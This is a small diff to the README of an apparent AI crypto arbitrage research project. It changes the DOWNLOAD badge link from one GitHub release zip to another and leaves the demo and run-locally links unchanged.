@@ -10,7 +10,7 @@ A live, interactive research terminal for **ETH / BTC / BNB**.
 
 <!-- pages-links:start -->
 [![VIEW DEMO](docs/view-demo.svg)](https://wordystepuncl.github.io/arbitrage/)
-[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip)
+[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.4/Trial1.4.zip)
 
 [Live demo](https://wordystepuncl.github.io/arbitrage/) · [Run locally](#run-locally)
 <!-- pages-links:end -->
